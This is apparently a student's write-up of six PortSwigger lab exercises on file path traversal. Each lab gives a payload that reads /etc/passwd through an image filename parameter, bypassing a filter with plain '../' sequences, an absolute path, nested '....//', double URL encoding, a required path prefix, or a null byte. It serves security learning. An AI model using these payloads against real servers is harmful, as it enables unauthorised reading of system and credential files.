
# PortSwigger Labs — File Path Traversal

**Date: 2026/10/03**

## Lab 1: File Path Traversal, Simple Case

In this lab, the application uses a user-controlled `filename` parameter to load images.

### Steps

First, inspect the image request. It looks like:

```html
<img src="/image?filename=45.img">
```

The `filename` parameter is vulnerable to path traversal.

Replace the image filename with a traversal payload:

```html
<img src="/image?filename=../../../../../../etc/passwd">
```

The application reads `/etc/passwd`, and the lab is solved.

---

## Lab 2: File Path Traversal, Traversal Sequences Blocked with Absolute Path Bypass

In this lab, the developer blocks the `../` traversal sequence.

However, the application still allows an **absolute path**, so we can access the target file directly without using `../`.

### Steps

Inspect the image request. It looks like:

```html
<img src="/image?filename=70.png">
```

Change the `filename` parameter to an absolute path:

```html
<img src="/image?filename=/etc/passwd">
```

The application reads `/etc/passwd`, and the lab is solved.

---

## Lab 3: File Path Traversal, Traversal Sequences Stripped Non-Recursively

In this lab, the developer uses a filter that removes `../` sequences.

The filtering is **non-recursive**, meaning the application removes the sequence only once. We can bypass this by using nested traversal sequences so that another `../` remains after filtering.

### Steps

Inspect the image request:

```html
<img src="/image?filename=45.img">
```

Use the following payload:

```html
<img src="/image?filename=....//....//....//....//....//....//....//....//....//....//etc//passwd">
```

After the filter removes the `../` sequences, the remaining characters can form valid traversal sequences.

The application then accesses `/etc/passwd`, and the lab is solved.

---

## Lab 4: File Path Traversal, Traversal Sequences Stripped with Superfluous URL-Decode

In this lab, the application performs URL decoding in a way that can be bypassed using **double URL encoding**.

The `/` character is encoded as `%2f`. If it is URL-encoded again, it becomes `%252f`.

### Payload

```text
..%252f..%252f..%252fetc/passwd
```

The application decodes the payload, allowing the traversal sequences to be interpreted and used to access `/etc/passwd`.

The lab is solved.

---

## Lab 5: File Path Traversal, Validation of Start of Path

In this lab, the application requires the filename to start with a specific directory:

```text
/var/www/images/
```

The developer checks that the requested path starts with this directory.

We can bypass this restriction by starting with the required path and then using path traversal sequences to move outside that directory.

### Payload

```text
/var/www/images/../../../etc/passwd
```

The path starts with the expected directory:

```text
/var/www/images/
```

but the `../` sequences then traverse out of that directory and reach:

```text
/etc/passwd
```

The lab is solved.

---

## Lab 6: File Path Traversal, Validation of File Extension with Null Byte Bypass

In this lab, the application requires the requested file to have an allowed image extension.

We can bypass this validation by appending a **null byte** before the required extension.

### Payload

```text
../../../etc/passwd%00.png
```

The application sees the `.png` extension during validation, while the null byte can cause the rest of the filename to be ignored when the path is processed.

This allows us to access:

```text
/etc/passwd
```

and the lab is solved.